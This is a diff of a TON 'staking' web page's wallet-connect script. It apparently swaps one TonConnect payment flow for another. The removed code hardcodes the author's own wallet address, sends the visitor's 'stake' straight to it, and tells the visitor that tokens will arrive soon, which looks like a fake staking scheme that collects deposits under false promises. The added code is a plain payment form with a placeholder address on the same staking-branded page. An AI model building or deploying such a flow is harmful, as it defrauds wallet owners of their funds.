@@ -309,76 +309,61 @@
 </script>
 
 <script type="module">
-    // ⚠️ СЮДА ВСТАВЬ СВОЙ АДРЕС КОШЕЛЬКА ⚠️
-    const MY_WALLET = "UQAq0NKzs0XtMyzbOn6ieHvAMudRq5ILy8oT_TOMLD8JEutW";
-    
-    // ПРАВИЛЬНЫЙ импорт (через CDN)
-    import TonConnect from 'https://cdn.jsdelivr.net/npm/@tonconnect/sdk@3.0.0/dist/tonconnect-sdk.min.js';
-    
-    // Элементы
-    const connectBtnTop = document.getElementById('connectBtnTop');
-    const connectBtnSide = document.getElementById('connectBtnSide');
-    const connectTextTop = document.getElementById('connectBtnTextTop');
-    const connectTextSide = document.getElementById('connectBtnTextSide');
-    const addrSide = document.getElementById('addrSide');
-    const amountRange = document.getElementById('amountRange');
-    const stakeBtn = document.getElementById('stakeBtn');
-    const txStatus = document.getElementById('txStatus');
+    // 🔴 ВСТАВЬ СВОЙ TON-АДРЕС (получатель)
+    const RECEIVER_ADDRESS = "UQ...ВСТАВЬ_ТВОЙ_АДРЕС...";
 
-    // Создаем connector
-    const connector = new TonConnect.TonConnect({
-        manifestUrl: 'https://kap352837598.github.io/tonconnect-manifest.json'
+    const tonConnectUI = new TonConnectUI({
+      manifestUrl: "https://kap352837598.github.io/tonstaking/tonconnect-manifest.json",
+      buttonRootId: "connect"
     });
 
-    // Подключаемся к UI
-    const tonConnectUI = new TonConnect.TonConnectUI({
-        connector: connector
+    const payBtn = document.getElementById("pay");
+    const amountEl = document.getElementById("amount");
+    const statusEl = document.getElementById("status");
+
+    function setStatus(msg) { statusEl.textContent = msg; }
+
+    tonConnectUI.onStatusChange(wallet => {
+      payBtn.disabled = !wallet;
+      setStatus(wallet ? "Wallet connected ✅" : "Connect wallet to continue.");
     });
 
-    // Отслеживаем подключение
-    tonConnectUI.onStatusChange((walletInfo) => {
-        const connected = !!walletInfo;
-        const text = connected ? '✅ Кошелёк подключён' : '🔗 Подключить кошелёк';
-        
-        if (connectTextTop) connectTextTop.textContent = text;
-        if (connectTextSide) connectTextSide.textContent = text;
-        
-        if (addrSide) {
-            addrSide.textContent = 'Wallet: ' + (walletInfo?.account?.address?.slice(0,6) + '...' || '—');
-        }
+    document.querySelectorAll('.quick').forEach(btn => {
+      btn.addEventListener('click', () => amountEl.value = btn.dataset.v);
     });
 
-    // Клик по кнопкам
-    if (connectBtnTop) connectBtnTop.onclick = () => tonConnectUI.openModal();
-    if (connectBtnSide) connectBtnSide.onclick = () => tonConnectUI.openModal();
-
-    // Отправка транзакции
-    if (stakeBtn) {
-        stakeBtn.onclick = async () => {
-            if (!tonConnectUI.connected) {
-                alert('Сначала подключи кошелёк');
-                return;
-            }
-
-            const amount = Number(amountRange?.value || 10);
-            if (txStatus) txStatus.textContent = '⏳ Отправка...';
-            
-            try {
-                const result = await tonConnectUI.sendTransaction({
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [{
-                        address: MY_WALLET,
-                        amount: (amount * 1e9).toString()
-                    }]
-                });
-                
-                if (txStatus) txStatus.textContent = '✅ Отправлено! Токены скоро поступят.';
-            } catch (e) {
-                if (txStatus) txStatus.textContent = '❌ Ошибка: ' + e.message;
-            }
-        };
+    function toNanoFromInput(value) {
+      const parts = String(value).replace(",", ".").trim().split(".");
+      const whole = parts[0] || "0";
+      const frac = (parts[1] || "").padEnd(9, "0").slice(0, 9);
+      return (BigInt(whole) * 1000000000n + BigInt(frac)).toString();
     }
-</script>
 
+    payBtn.addEventListener("click", async () => {
+      setStatus("");
+
+      const v = String(amountEl.value).replace(",", ".").trim();
+      if (!v || Number(v) <= 0) {
+        setStatus("Enter a valid TON amount.");
+        return;
+      }
+
+      const nano = toNanoFromInput(v);
+
+      try {
+        await tonConnectUI.sendTransaction({
+          validUntil: Math.floor(Date.now() / 1000) + 300,
+          messages: [{
+            address: RECEIVER_ADDRESS,
+            amount: nano
+          }]
+        });
+
+        setStatus("Request sent ✅\nConfirm in wallet to complete.");
+      } catch (e) {
+        setStatus("Canceled or error.");
+      }
+    });
+  </script>
 </body>
 </html>
